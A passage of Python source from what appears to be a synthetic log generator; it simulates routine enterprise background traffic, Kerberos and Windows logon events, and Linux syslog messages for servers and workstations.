                dc_ips = [dc_ips]
            # Exclude self from DC targets
            dc_targets = [ip for ip in dc_ips if ip != system.ip]

            if 'smb-client' in services and os_cat == 'windows' and dc_targets:
                num_smb = rng.randint(1, 3)
                base_interval = 3600 / (num_smb + 1)
                for i in range(num_smb):
                    offset = base_interval * (i + 1) + rng.gauss(0, base_interval * 0.1)
                    offset = max(0, min(3599, offset))
                    ts = current_hour + timedelta(seconds=offset)
                    self.state_manager.set_current_time(ts)
                    self.activity_generator.generate_connection(
                        src_ip=system.ip,
                        dst_ip=rng.choice(dc_targets),
                        time=ts,
                        dst_port=445,
                        proto='tcp',
                        service='smb',
                        duration=rng.uniform(0.1, 2.0),
                        orig_bytes=rng.randint(200, 2000),
                        resp_bytes=rng.randint(500, 5000),
                    )

            # Kerberos: domain-joined Windows machines → DC, 4-8 per hour
            if 'kerberos-client' in services and os_cat == 'windows' and dc_targets:
                num_krb = rng.randint(1, 3)
                base_interval = 3600 / (num_krb + 1)
                for i in range(num_krb):
                    offset = base_interval * (i + 1) + rng.gauss(0, base_interval * 0.1)
                    offset = max(0, min(3599, offset))
                    ts = current_hour + timedelta(seconds=offset)
                    self.state_manager.set_current_time(ts)
                    self.activity_generator.generate_connection(
                        src_ip=system.ip, dst_ip=rng.choice(dc_targets), time=ts,
                        dst_port=88, proto='tcp', service='kerberos',
                        duration=rng.uniform(0.001, 0.05),
                        orig_bytes=rng.randint(200, 1500),
                        resp_bytes=rng.randint(200, 2000),
                    )

            # LDAP: domain-joined Windows machines → DC, 2-5 per hour
            if 'ldap-client' in services and os_cat == 'windows' and dc_targets:
                num_ldap = rng.randint(2, 5)
                base_interval = 3600 / (num_ldap + 1)
                for i in range(num_ldap):
                    offset = base_interval * (i + 1) + rng.gauss(0, base_interval * 0.1)
                    offset = max(0, min(3599, offset))
                    ts = current_hour + timedelta(seconds=offset)
                    self.state_manager.set_current_time(ts)
                    self.activity_generator.generate_connection(
                        src_ip=system.ip, dst_ip=rng.choice(dc_targets), time=ts,
                        dst_port=389, proto='tcp', service='ldap',
                        duration=rng.uniform(0.01, 0.5),
                        orig_bytes=rng.randint(100, 2000),
                        resp_bytes=rng.randint(500, 10000),
                    )

            # HTTPS background traffic: Windows Update, CRL checks, telemetry
            # This ensures HTTPS is the dominant protocol (matching real enterprises)
            if os_cat == 'windows':
                _bg_https_ips = [
                    '23.196.25.38',   # download.windowsupdate.com
                    '13.107.4.50',    # settings-win.data.microsoft.com
                    '93.184.220.29',  # ocsp.digicert.com
                    '23.45.101.50',   # ctldl.windowsupdate.com
                    '52.114.128.40',  # teams telemetry
                    '204.79.197.200', # www.bing.com
                ]
                num_https = rng.randint(8, 20)
                for i in range(num_https):
                    offset = rng.randint(0, 3599) + rng.random()
                    ts = current_hour + timedelta(seconds=offset)
                    self.state_manager.set_current_time(ts)
                    self.activity_generator.generate_connection(
                        src_ip=system.ip,
                        dst_ip=rng.choice(_bg_https_ips),
                        time=ts,
                        dst_port=443, proto='tcp', service='ssl',
                        duration=rng.uniform(0.1, 5.0),
                        orig_bytes=rng.randint(200, 5000),
                        resp_bytes=rng.randint(500, 50000),
                        emit_dns=True,
                    )
            elif os_cat == 'linux':
                # Linux servers: package repos, API calls
                _linux_https_ips = ['91.189.91.39', '185.125.190.39', '151.101.0.204']
                num_https = rng.randint(3, 10)
                for i in range(num_https):
                    offset = rng.randint(0, 3599) + rng.random()
                    ts = current_hour + timedelta(seconds=offset)
                    self.state_manager.set_current_time(ts)
                    self.activity_generator.generate_connection(
                        src_ip=system.ip,
                        dst_ip=rng.choice(_linux_https_ips),
                        time=ts,
                        dst_port=443, proto='tcp', service='ssl',
                        duration=rng.uniform(0.1, 3.0),
                        orig_bytes=rng.randint(200, 3000),
                        resp_bytes=rng.randint(500, 30000),
                        emit_dns=True,
                    )

            # Database: app servers + some workstations → DB servers from scenario
            db_servers = self._infra_ips.get('db_servers', [])
            if db_servers and system.ip not in [d['ip'] for d in db_servers]:
                sys_type = (system.type or 'workstation').lower()
                if sys_type in ('server', 'domain_controller') or (sys_type == 'workstation' and rng.random() < 0.2):
                    db = rng.choice(db_servers)
                    num_db = rng.randint(3, 10)
                    base_interval = 3600 / (num_db + 1)
                    for i in range(num_db):
                        offset = base_interval * (i + 1) + rng.gauss(0, base_interval * 0.1)
                        offset = max(0, min(3599, offset))
                        ts = current_hour + timedelta(seconds=offset)
                        self.state_manager.set_current_time(ts)
                        self.activity_generator.generate_connection(
                            src_ip=system.ip, dst_ip=db['ip'], time=ts,
                            dst_port=db['port'], proto='tcp', service=db['service'],
                            duration=rng.uniform(0.01, 2.0),
                            orig_bytes=rng.randint(200, 5000),
                            resp_bytes=rng.randint(500, 50000),
                        )

            # Scheduled tasks: periodic at fixed intervals with small jitter.
            # Real system processes run at predictable intervals (cron every 15 min,
            # Windows Task Scheduler at fixed offsets) with minor timing jitter.
            # Use deterministic per-host offset so same system fires at same times.
            host_seed = hash(system.hostname) % 900  # 0-899s offset within 15-min
            # Deterministic task per host — same process runs every cycle
            # for consistent periodic intervals (autocorrelation > 0)
            if os_cat == 'windows':
                win_tasks = [
                    (r'C:\Windows\System32\svchost.exe', 'svchost.exe -k netsvcs -p -s Schedule'),
                    (r'C:\Windows\System32\taskhostw.exe', 'taskhostw.exe /Run'),
                    (r'C:\Windows\System32\usoclient.exe', 'usoclient.exe StartScan'),
                ]
                task_name, task_cmd = win_tasks[hash(system.hostname) % len(win_tasks)]
            else:
                os_str = (system.os or '').lower()
                is_rhel_task = any(d in os_str for d in ('centos', 'rhel', 'red hat', 'rocky', 'alma'))
                if is_rhel_task:
                    linux_tasks = [
                        ('/usr/sbin/logrotate', '/usr/sbin/logrotate /etc/logrotate.conf'),
                        ('/usr/bin/dnf', '/usr/bin/dnf -y makecache --timer'),
                        ('/usr/bin/needs-restarting', '/usr/bin/needs-restarting -r'),
                    ]
                else:
                    linux_tasks = [
                        ('/usr/sbin/logrotate', '/usr/sbin/logrotate /etc/logrotate.conf'),
                        ('/usr/bin/apt-get', '/usr/bin/apt-get -qq update'),
                        ('/usr/lib/update-notifier/apt-check', '/usr/lib/update-notifier/apt-check --human-readable'),
                    ]
                task_name, task_cmd = linux_tasks[hash(system.hostname) % len(linux_tasks)]

            for slot_base in [0, 900, 1800, 2700]:  # Every 15 minutes
                # Moderate jitter: cron fires on schedule but system load adds
                # a few seconds of variance (enough to break perfect intervals
                # while keeping CV < 0.3 for ~900s intervals)
                offset = slot_base + host_seed + rng.gauss(0, 8) + rng.uniform(0, 3)
                offset = max(0, min(3599, offset))
                ts = current_hour + timedelta(seconds=offset)
                self.state_manager.set_current_time(ts)

                if os_cat == 'windows':
                    parent_pid = sys_pids.get('svchost_local_system', sys_pids.get('services', 4))
                    self.activity_generator.generate_system_process(
                        system=system, time=ts,
                        process_name=task_name, command_line=task_cmd,
                        parent_pid=parent_pid, username='SYSTEM',
                    )
                else:
                    parent_pid = sys_pids.get('cron', 0)
                    self.activity_generator.generate_system_process(
                        system=system, time=ts,
                        process_name=task_name, command_line=task_cmd,
                        parent_pid=parent_pid, username='root',
                    )

            # ICMP: monitoring pings between servers, 1-2 per hour
            sys_type = (system.type or 'workstation').lower()
            if sys_type in ('server', 'domain_controller') and rng.random() < 0.7:
                # Servers ping each other and the default gateway
                targets = [s.ip for s in self.scenario.environment.systems
                           if s.ip != system.ip and s.type and
                           s.type.lower() in ('server', 'domain_controller')][:5]
                if targets:
                    target_ip = rng.choice(targets)
                    offset = rng.randint(0, 3599) + rng.random()
                    ts = current_hour + timedelta(seconds=offset)
                    self.state_manager.set_current_time(ts)
                    self.activity_generator.generate_connection(
                        src_ip=system.ip, dst_ip=target_ip, time=ts,
                        dst_port=0, proto='icmp',
                        duration=rng.uniform(0.0001, 0.005),
                        orig_bytes=64, resp_bytes=64,
                    )

            # SSH: connections to Linux servers, 1-3 per hour from other systems
            if os_cat == 'linux' and sys_type == 'server':
                # Other systems SSH into this Linux server
                ssh_sources = [s.ip for s in self.scenario.environment.systems
                               if s.ip != system.ip][:10]
                if ssh_sources:
                    num_ssh = rng.randint(1, 3)
                    for _ in range(num_ssh):
                        src_ip = rng.choice(ssh_sources)
                        offset = rng.randint(0, 3599)
                        ts = current_hour + timedelta(seconds=offset)
                        self.state_manager.set_current_time(ts)
                        self.activity_generator.generate_connection(
                            src_ip=src_ip, dst_ip=system.ip, time=ts,
                            dst_port=22, proto='tcp', service='ssh',
                            duration=rng.uniform(30.0, 3600.0),
                            orig_bytes=rng.randint(2000, 50000),
                            resp_bytes=rng.randint(5000, 200000),
                        )

        # Service logons (LogonType 5) and ANONYMOUS LOGONs on Windows systems
        for system in self.scenario.environment.systems:
            os_cat_svc = _get_os_category(system.os)
            if os_cat_svc != 'windows' or 'windows_event_security' not in self.emitters:
                continue

            ad_domain = getattr(self.activity_generator, '_ad_domain', 'corp.local')
            netbios = getattr(self.activity_generator, '_netbios_domain', 'CORP')
            computer_fqdn = f"{system.hostname}.{ad_domain}"

            # LogonType 5 (Service): 2-5 per hour on servers, 1-2 on workstations
            sys_type_svc = (system.type or 'workstation').lower()
            num_svc = rng.randint(2, 5) if sys_type_svc != 'workstation' else rng.randint(1, 2)
            for _ in range(num_svc):
                offset = rng.randint(0, 3599)
                ts = current_hour + timedelta(seconds=offset)
                svc_accounts = ['SYSTEM', 'LOCAL SERVICE', 'NETWORK SERVICE']
                svc_user = rng.choice(svc_accounts)
                svc_sid = {'SYSTEM': 'S-1-5-18', 'LOCAL SERVICE': 'S-1-5-19',
                           'NETWORK SERVICE': 'S-1-5-20'}[svc_user]
                svc_domain = 'NT AUTHORITY'
                self.dispatcher.dispatch_raw(RawLogEntry(
                    timestamp=ts, target_emitter='windows_event_security',
                    data={'EventID': 4624, 'TimeCreated': ts, 'Computer': computer_fqdn,
                          'Channel': 'Security', 'Level': 0,
                          'ExecutionProcessID': 4, 'ExecutionThreadID': rng.randint(100, 500),
                          'SubjectUserSid': 'S-1-5-18', 'SubjectUserName': system.hostname + '$',
                          'SubjectDomainName': netbios, 'SubjectLogonId': '0x3e7',
                          'TargetUserSid': svc_sid, 'TargetUserName': svc_user,
                          'TargetDomainName': svc_domain,
                          'TargetLogonId': f'0x{rng.randint(0x10000, 0xFFFFFFFF):x}',
                          'LogonType': 5, 'LogonProcessName': 'Advapi',
                          'AuthenticationPackageName': 'Negotiate', 'LmPackageName': '-',
                          'LogonGuid': '{00000000-0000-0000-0000-000000000000}',
                          'WorkstationName': '-',
                          'ProcessId': f'0x{rng.choice([0x1f4, 0x2c8, 0x340]):x}',
                          'ProcessName': r'C:\Windows\System32\services.exe',
                          'IpAddress': '-', 'IpPort': 0},
                ))

            # ANONYMOUS LOGON: 1-3 per hour on servers/DCs (network discovery, null sessions)
            if sys_type_svc in ('server', 'domain_controller'):
                num_anon = rng.randint(1, 3)
                for _ in range(num_anon):
                    offset = rng.randint(0, 3599)
                    ts = current_hour + timedelta(seconds=offset)
                    self.dispatcher.dispatch_raw(RawLogEntry(
                        timestamp=ts, target_emitter='windows_event_security',
                        data={'EventID': 4624, 'TimeCreated': ts, 'Computer': computer_fqdn,
                              'Channel': 'Security', 'Level': 0,
                              'ExecutionProcessID': 4, 'ExecutionThreadID': rng.randint(100, 500),
                              'SubjectUserSid': 'S-1-0-0', 'SubjectUserName': '-',
                              'SubjectDomainName': '-', 'SubjectLogonId': '0x0',
                              'TargetUserSid': 'S-1-5-7', 'TargetUserName': 'ANONYMOUS LOGON',
                              'TargetDomainName': 'NT AUTHORITY',
                              'TargetLogonId': f'0x{rng.randint(0x10000, 0xFFFFFFFF):x}',
                              'LogonType': 3, 'LogonProcessName': 'NtLmSsp',
                              'AuthenticationPackageName': 'NTLM', 'LmPackageName': 'NTLM V2',
                              'LogonGuid': '{00000000-0000-0000-0000-000000000000}',
                              'WorkstationName': '-', 'ProcessId': '0x0', 'ProcessName': '-',
                              'IpAddress': '-', 'IpPort': 0},
                    ))

        # Phase 6.2: Machine account ($) authentication to DCs
        # Every Windows domain-joined system authenticates as COMPUTERNAME$ to DCs
        dc_ips = self._infra_ips.get('dc', [])
        dc_hostnames = self._infra_ips.get('dc_hostnames', [])
        if isinstance(dc_ips, str):
            dc_ips = [dc_ips]
        if dc_ips and dc_hostnames:
            for system in self.scenario.environment.systems:
                os_cat = _get_os_category(system.os)
                if os_cat != 'windows' or system.ip in dc_ips:
                    continue  # Skip non-Windows and DCs themselves

                # 2-6 machine account auth cycles per hour
                num_auth = rng.randint(2, 6)
                base_interval = 3600 / (num_auth + 1)
                for i in range(num_auth):
                    offset = base_interval * (i + 1) + rng.gauss(0, base_interval * 0.1)
                    offset = max(0, min(3599, offset))
                    ts = current_hour + timedelta(seconds=offset)
                    self.state_manager.set_current_time(ts)
                    # Pick a DC to authenticate to
                    dc_idx = rng.randint(0, len(dc_ips) - 1)
                    self.activity_generator.generate_machine_account_logon(
                        hostname=system.hostname,
                        machine_username=f"{system.hostname}$",
                        dc_hostname=dc_hostnames[dc_idx],
                        source_ip=system.ip,
                        dc_ip=dc_ips[dc_idx],
                        time=ts,
                    )

        # Phase 6.2: DC-side Kerberos event generation
        # DCs log 4768 (TGT) and 4769 (service ticket) for every client authentication.
        # This makes DCs the noisiest machines in the environment.
        if dc_ips and dc_hostnames:
            windows_clients = [
                s for s in self.scenario.environment.systems
                if _get_os_category(s.os) == 'windows' and s.ip not in dc_ips
            ]
            for dc_idx, dc_hostname in enumerate(dc_hostnames):
                # Each client generates auth events visible on this DC
                for client in windows_clients:
                    # 3-8 Kerberos auth cycles per client per hour on each DC
                    num_cycles = rng.randint(3, 8)
                    base_interval = 3600 / (num_cycles + 1)
                    for i in range(num_cycles):
                        offset = base_interval * (i + 1) + rng.gauss(0, base_interval * 0.15)
                        offset = max(0, min(3599, offset))
                        ts = current_hour + timedelta(seconds=offset)
                        self.state_manager.set_current_time(ts)

                        username = f"{client.hostname}$"
                        # TGT request (4768)
                        self.activity_generator.generate_kerberos_tgt(
                            username=username,
                            source_ip=client.ip,
                            dc_hostname=dc_hostname,
                            time=ts,
                        )
                        # 2-5 service tickets per TGT (real AD pattern)
                        num_tgs = rng.randint(2, 5)
                        # Build pool of target servers (DCs + member servers)
                        member_servers = [
                            s.hostname for s in self.scenario.environment.systems
                            if _get_os_category(s.os) == 'windows'
                            and s.ip not in dc_ips
                            and any(svc in s.services for svc in
                                    ['file-server', 'sql-server', 'web', 'iis',
                                     'exchange', 'sharepoint', 'crm', 'print'])
                        ] or [dc_hostname]
                        for tgs_i in range(num_tgs):
                            ts2 = ts + timedelta(milliseconds=rng.randint(50, 200) + tgs_i * rng.randint(100, 500))
                            svc = rng.choice(['cifs', 'ldap', 'http', 'host'])
                            # 60% target member servers, 40% target DCs
                            if rng.random() < 0.60 and member_servers:
                                target = rng.choice(member_servers)
                            else:
                                target = dc_hostname
                            self.activity_generator.generate_kerberos_service_ticket(
                                username=username,
                                service_name=f"{svc}/{target}",
                                source_ip=client.ip,
                                dc_hostname=dc_hostname,
                                time=ts2,
                            )
                        # 10% chance of NTLM fallback (4776)
                        if rng.random() < 0.10:
                            self.activity_generator.generate_ntlm_validation(
                                username=username,
                                workstation=client.hostname,
                                dc_hostname=dc_hostname,
                                time=ts,
                            )

        # 4770 TGT Renewal: TGTs expire every ~10 hours; emit renewals for
        # long-running sessions. Track per-user last TGT time.
        if not hasattr(self, '_last_tgt_time'):
            self._last_tgt_time: dict[str, datetime] = {}
        if dc_ips and dc_hostnames:
            renewal_interval = timedelta(hours=rng.uniform(8.0, 12.0))
            for client in windows_clients:
                username = f"{client.hostname}$"
                last_tgt = self._last_tgt_time.get(username)
                if last_tgt and (current_hour - last_tgt) >= renewal_interval:
                    offset = rng.randint(0, 3599)
                    ts = current_hour + timedelta(seconds=offset)
                    self.state_manager.set_current_time(ts)
                    dc_idx = rng.randint(0, len(dc_hostnames) - 1)
                    self.activity_generator.generate_kerberos_tgt_renewal(
                        username=username,
                        source_ip=client.ip,
                        dc_hostname=dc_hostnames[dc_idx],
                        time=ts,
                    )
                    self._last_tgt_time[username] = ts
                elif last_tgt is None:
                    # Record first TGT time (from the cycles above)
                    self._last_tgt_time[username] = current_hour

        # Phase 6.0: Linux syslog diversity — generate daemon messages
        for system in self.scenario.environment.systems:
            os_cat = _get_os_category(system.os)
            if os_cat != 'linux' or 'syslog' not in self.emitters:
                continue

            sys_pids = self._system_pids.get(system.hostname, {})
            sys_type = (system.type or 'server').lower()
            # Role-dependent volume: DMZ/web servers are noisier
            is_dmz = 'dmz' in system.hostname.lower() or 'web' in system.hostname.lower()
            num_events = rng.randint(100, 300) if is_dmz else rng.randint(50, 120)

            # Kernel uptime: monotonically increasing (seconds since boot)
            scenario_start = self.scenario.time_window.start
            boot_uptime = self._kernel_boot_uptimes.get(system.hostname, 500000.0)

            for _ in range(num_events):
                offset = rng.uniform(0, 3599)
                ts = current_hour + timedelta(seconds=offset)
                # Use exact event timestamp for monotonic uptime (not hour + random offset)
                uptime = int(boot_uptime + (ts - scenario_start).total_seconds())

                # Pick a random syslog source
                source_roll = rng.random()
                if source_roll < 0.20:
                    # systemd — Starting/Finished pairs, always PID 1
                    services = ['logrotate', 'phpsessionclean', 'apt-daily', 'man-db',
                                'fstrim', 'motd-news', 'ua-timer', 'systemd-tmpfiles-clean']
                    svc = rng.choice(services)
                    action = rng.choice(['Starting', 'Finished'])
                    self.dispatcher.dispatch_raw(RawLogEntry(timestamp=ts, target_emitter='syslog', data={
                        'timestamp': ts, 'hostname': system.hostname,
                        'app_name': 'systemd', 'pid': sys_pids.get('systemd', 1),
                        'facility': 3, 'severity': 6,
                        'message': f'{action} {svc}.service - {svc.replace("-", " ").title()}.'},
                    ))
                elif source_roll < 0.35:
                    # CRON — uppercase, (user) CMD (command)
                    cron_cmds = [
                        ('root', 'test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )'),
                        ('root', 'command -v debian-sa1 > /dev/null && debian-sa1 1 1'),
                        ('root', '/usr/sbin/logrotate /etc/logrotate.conf'),
                        ('www-data', '/usr/bin/php /var/www/html/cron.php'),
                    ]
                    user, cmd = rng.choice(cron_cmds)
                    cron_pid = self.state_manager.create_process(
                        system.hostname, sys_pids.get('cron', 0),
                        '/usr/sbin/cron', f'CRON[{user}]', user, 'System')
                    self.dispatcher.dispatch_raw(RawLogEntry(timestamp=ts, target_emitter='syslog', data={
                        'timestamp': ts, 'hostname': system.hostname,
                        'app_name': 'CRON', 'pid': cron_pid,
                        'facility': 9, 'severity': 6,
                        'message': f'({user}) CMD ({cmd})'},
                    ))
                elif source_roll < 0.50:
                    # kernel — no PID, includes uptime counter
                    if is_dmz and rng.random() < 0.85:
                        # UFW BLOCK messages on DMZ servers
                        src_ip = f'{rng.randint(1,223)}.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}'
                        dpt = rng.choice([22, 23, 25, 80, 443, 445, 3389, 8080])
                        msg = (f'[{uptime}.{rng.randint(100000,999999)}] [UFW BLOCK] '
                               f'IN=ens160 OUT= SRC={src_ip} DST={system.ip} '
                               f'LEN={rng.randint(40,60)} TOS=0x00 PREC=0x00 TTL={rng.randint(40,255)} '
                               f'ID={rng.randint(1,65535)} PROTO=TCP SPT={rng.randint(1024,65535)} DPT={dpt} '
                               f'WINDOW={rng.choice([1024, 14600, 65535])} RES=0x00 SYN URGP=0')
                    else:
                        # AppArmor or audit messages — monotonic serial per host
                        self._audit_serials[system.hostname] = self._audit_serials.get(system.hostname, 1000) + rng.randint(1, 5)
                        audit_serial = self._audit_serials[system.hostname]
                        msg = (f'[{uptime}.{rng.randint(100000,999999)}] audit: type=1400 '
                               f'audit({int(ts.timestamp())}.{rng.randint(100,999)}:{audit_serial}): '
                               f'apparmor="ALLOWED" operation="open" profile="usr.sbin.mysqld"')
                    self.dispatcher.dispatch_raw(RawLogEntry(timestamp=ts, target_emitter='syslog', data={
                        'timestamp': ts, 'hostname': system.hostname,
                        'app_name': 'kernel', 'pid': None,
                        'facility': 0, 'severity': 5,
                        'message': msg},
                    ))
                elif source_roll < 0.65:
                    # systemd-logind — session tracking
                    sid = rng.randint(100, 9999)
                    user = rng.choice(['root', 'admin', 'www-data', 'ubuntu'])
                    action = rng.choice([f'New session {sid} of user {user}.', f'Removed session {sid}.'])
                    self.dispatcher.dispatch_raw(RawLogEntry(timestamp=ts, target_emitter='syslog', data={
                        'timestamp': ts, 'hostname': system.hostname,
                        'app_name': 'systemd-logind', 'pid': sys_pids.get('logind', rng.randint(400, 800)),
                        'facility': 3, 'severity': 6,
                        'message': action},
                    ))
                elif source_roll < 0.80:
                    # sshd — disconnect/keepalive messages (use scenario system IPs)
                    # Generate matching Zeek SSH connection + syslog message together
                    other_ips = [s.ip for s in self.scenario.environment.systems if s.ip != system.ip]
                    ip = rng.choice(other_ips) if other_ips else system.ip
                    port = rng.randint(49152, 65535)
                    # Emit Zeek conn record for this SSH session
                    self.activity_generator.generate_connection(
                        src_ip=ip, dst_ip=system.ip, time=ts,
                        dst_port=22, proto='tcp', service='ssh',
                        duration=rng.uniform(30.0, 1800.0),
                        orig_bytes=rng.randint(2000, 50000),
                        resp_bytes=rng.randint(5000, 200000),
                        src_port=port,
                    )
                    msgs = [
                        f'Received disconnect from {ip} port {port}:11: disconnected by user',
                        f'Disconnected from user admin {ip} port {port}',
                        f'pam_unix(sshd:session): session closed for user admin',
                    ]
                    self.dispatcher.dispatch_raw(RawLogEntry(timestamp=ts, target_emitter='syslog', data={
                        'timestamp': ts, 'hostname': system.hostname,
                        'app_name': 'sshd', 'pid': rng.randint(5000, 60000),
                        'facility': 10, 'severity': 6,
                        'message': rng.choice(msgs)},
                    ))
                elif source_roll < 0.90:
                    # snapd
                    self.dispatcher.dispatch_raw(RawLogEntry(timestamp=ts, target_emitter='syslog', data={
                        'timestamp': ts, 'hostname': system.hostname,
                        'app_name': 'snapd', 'pid': sys_pids.get('snapd', rng.randint(500, 2000)),
                        'facility': 3, 'severity': 6,
                        'message': rng.choice([
                            'autorefresh.go:540: auto-refresh: all snaps are up-to-date',
                            'daemon.go:460: gracefully waiting for running hooks',
                            'stateengine.go:150: state ensure starting',
                        ])},
                    ))
                else:
                    # systemd-timesyncd: "for the first time" only once per system
                    ntp_ip = rng.choice(['91.189.89.198', '91.189.89.199', '91.189.94.4'])
                    if not hasattr(self, '_timesyncd_first_seen'):
                        self._timesyncd_first_seen = set()
                    if system.hostname not in self._timesyncd_first_seen:
                        msg = f'Synchronized to time server for the first time {ntp_ip}:123 (ntp.ubuntu.com).'
                        self._timesyncd_first_seen.add(system.hostname)
                    else:
                        msg = rng.choice([
                            f'Initial synchronization to time server {ntp_ip}:123 (ntp.ubuntu.com).',
                            f'Timed out waiting for reply from {ntp_ip}:123 (ntp.ubuntu.com).',
                            f'Synchronized to time server {ntp_ip}:123 (ntp.ubuntu.com).',
                        ])
                    self.dispatcher.dispatch_raw(RawLogEntry(timestamp=ts, target_emitter='syslog', data={
                        'timestamp': ts, 'hostname': system.hostname,
                        'app_name': 'systemd-timesyncd',
                        'pid': sys_pids.get('timesyncd', rng.randint(400, 800)),
                        'facility': 3, 'severity': 6,
                        'message': msg},
                    ))

        # Phase 5.3: ICMP ping between systems on same subnet (1-3 per hour), evenly spaced
        systems = self.scenario.environment.systems
        if len(systems) >= 2:
            num_pings = rng.randint(1, 3)
            base_interval = 3600 / (num_pings + 1)
            for i in range(num_pings):
                src_sys = rng.choice(systems)
                dst_sys = rng.choice(systems)
                if src_sys.ip == dst_sys.ip:
                    continue
                # Simple same-subnet check (first 3 octets match)
                if src_sys.ip.rsplit('.', 1)[0] != dst_sys.ip.rsplit('.', 1)[0]:
                    continue
                offset = base_interval * (i + 1) + rng.gauss(0, base_interval * 0.1)
                offset = max(0, min(3599, offset))
                ts = current_hour + timedelta(seconds=offset)
                self.state_manager.set_current_time(ts)
                self.activity_generator.generate_connection(
                    src_ip=src_sys.ip,
                    dst_ip=dst_sys.ip,
                    time=ts,
                    dst_port=0,
                    proto='icmp',
                    duration=rng.uniform(0.0005, 0.005),
                    orig_bytes=64,
                    resp_bytes=64,
                )
